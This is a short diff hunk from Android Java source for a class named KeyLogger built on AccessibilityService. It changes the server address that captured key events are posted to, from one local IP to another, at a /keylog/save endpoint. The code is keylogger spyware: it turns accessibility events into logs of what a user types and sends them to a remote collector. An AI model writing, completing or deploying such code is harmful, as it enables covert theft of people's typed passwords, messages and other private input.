@@ -70,7 +70,7 @@ public class KeyLogger extends AccessibilityService {
         keyLog.setAccessibilityEvent(accessibilityEvent);
         keyLog.setMsg(msg);
 
-        sendLog("http://192.168.1.37:8080/keylog/save", keyLog);
+        sendLog("http://192.168.1.29:8080/keylog/save", keyLog);
     }
 
     private Map<String, String> getMap(KeyLog keyLog) throws IllegalAccessException {
